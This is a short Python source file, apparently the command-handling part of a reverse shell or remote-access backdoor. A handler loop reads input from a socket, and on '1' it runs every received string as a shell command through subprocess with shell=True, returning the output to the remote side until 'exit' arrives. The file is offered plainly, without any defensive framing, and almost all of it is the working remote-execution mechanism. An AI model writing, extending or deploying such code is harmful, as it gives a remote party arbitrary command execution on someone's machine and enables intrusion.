
import subprocess

def execute_command(sock):
    print("[+] Executing commands")
    while True:
        user_data= sock.recieve_data()
        if user_data=="exit":
            print("[+] Exiting shell")
            break
        if user_data=="":
            continue
        output = subprocess.run([user_data],shell=True, capture_output=True)
        if output.stderr.decode("utf-8")=="":
            response=output.stdout.decode("utf-8")
        else:
            response=output.stderr.decode("utf-8")
        sock.send_data(response)

def handler(sock):
    print("[+] Handler started")
    while True:
        user_input=sock.recieve_data()
        print("[+] User input is: ", user_input)
        if user_input=="exit":
            print("[+] Exiting handler")
            break
        if user_input=="1":
            print("[+] Starting shell")
            execute_command(sock)